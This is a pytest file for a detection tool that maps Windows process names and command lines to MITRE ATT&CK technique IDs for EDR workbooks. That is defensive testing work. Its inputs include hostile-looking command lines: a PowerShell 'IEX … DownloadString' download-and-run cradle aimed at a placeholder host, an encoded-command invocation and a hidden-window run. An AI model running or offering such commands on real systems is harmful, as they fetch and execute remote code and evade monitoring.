"""
Tests for edr_workbook_builder.attck:
  - tag_attck
  - add_attck_column
"""

import pandas as pd
import pytest

from edr_workbook_builder.attck import PROCESS_TECHNIQUES, add_attck_column, tag_attck


class TestTagAttck:
    def test_powershell_exe(self):
        techs = tag_attck("powershell.exe")
        assert "T1059.001" in techs

    def test_full_path_powershell(self):
        techs = tag_attck(r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe")
        assert "T1059.001" in techs

    def test_rundll32(self):
        techs = tag_attck("rundll32.exe")
        assert "T1218.011" in techs

    def test_cmd(self):
        techs = tag_attck("cmd.exe")
        assert "T1059.003" in techs

    def test_unknown_process_no_techs(self):
        techs = tag_attck("notepad.exe")
        assert techs == []

    def test_encoded_command_flag(self):
        techs = tag_attck("powershell.exe", "-EncodedCommand JABhAD0AMQAyADMAIAA=")
        assert "T1059.001" in techs
        assert "T1027" in techs

    def test_hidden_window(self):
        techs = tag_attck("powershell.exe", "-WindowStyle Hidden -Command whoami")
        assert "T1564.003" in techs

    def test_download_string(self):
        techs = tag_attck("powershell.exe", "IEX (New-Object Net.WebClient).DownloadString('http://x')")
        assert "T1105" in techs

    def test_no_duplicates(self):
        # T1059.001 would come from both process name and IEX pattern — should appear once.
        techs = tag_attck("powershell.exe", "IEX (invoke-expression 'whoami')")
        assert techs.count("T1059.001") == 1

    def test_empty_process_and_cmdline(self):
        assert tag_attck("", "") == []

    def test_certutil(self):
        assert "T1140" in tag_attck("certutil.exe")

    def test_mshta(self):
        assert "T1218.005" in tag_attck("mshta.exe")

    def test_schtasks_create(self):
        techs = tag_attck("schtasks.exe", "schtasks /create /tn test /tr cmd")
        assert "T1053.005" in techs

    def test_process_techniques_nonempty(self):
        assert len(PROCESS_TECHNIQUES) > 0


class TestAddAttckColumn:
    def _make_df(self, **cols):
        return pd.DataFrame({k: [v] for k, v in cols.items()})

    def test_column_inserted_after_process_col(self):
        df = self._make_df(ImageFileName="powershell.exe", CommandLine="whoami", Extra="x")
        out = add_attck_column(df)
        col_list = list(out.columns)
        assert "ATT&CK" in col_list
        assert col_list.index("ATT&CK") == col_list.index("ImageFileName") + 1

    def test_powershell_tagged(self):
        df = self._make_df(ImageFileName="powershell.exe", CommandLine="")
        out = add_attck_column(df)
        assert "T1059.001" in out["ATT&CK"].iloc[0]

    def test_no_process_col_appended_at_end(self):
        df = self._make_df(SomeCol="value", CommandLine="")
        out = add_attck_column(df)
        assert out.columns[-1] == "ATT&CK"

    def test_empty_df_no_error(self):
        df = pd.DataFrame({"ImageFileName": [], "CommandLine": []})
        out = add_attck_column(df)
        assert "ATT&CK" in out.columns
        assert len(out) == 0

    def test_unknown_process_empty_tag(self):
        df = self._make_df(ImageFileName="notepad.exe", CommandLine="")
        out = add_attck_column(df)
        assert out["ATT&CK"].iloc[0] == ""

    def test_explicit_cols_used(self):
        df = self._make_df(Proc="rundll32.exe", CmdLine="")
        out = add_attck_column(df, process_col="Proc", cmdline_col="CmdLine")
        assert "T1218.011" in out["ATT&CK"].iloc[0]

    def test_multiple_techniques_comma_separated(self):
        df = self._make_df(
            ImageFileName="powershell.exe",
            CommandLine="-EncodedCommand JABhAD0AMQAyADMAIAA=",
        )
        out = add_attck_column(df)
        val = out["ATT&CK"].iloc[0]
        assert "," in val  # multiple techniques joined

    def test_original_df_not_mutated(self):
        df = self._make_df(ImageFileName="powershell.exe", CommandLine="")
        _ = add_attck_column(df)
        assert "ATT&CK" not in df.columns
